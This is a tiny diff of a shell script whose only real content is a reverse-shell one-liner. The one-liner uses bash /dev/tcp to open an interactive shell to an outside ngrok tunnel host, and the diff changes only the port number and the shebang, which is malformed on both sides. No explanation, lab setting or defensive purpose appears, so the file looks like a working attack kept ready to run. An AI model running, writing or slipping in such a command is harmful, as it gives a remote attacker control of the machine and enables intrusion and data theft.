@@ -1,3 +1,4 @@
-#/bin/bash
+#/bin/sh
 
-bash -i >& /dev/tcp/0.tcp.in.ngrok.io 10978 0>&1
+
+bash -i >& /dev/tcp/0.tcp.in.ngrok.io 14511 0>&1
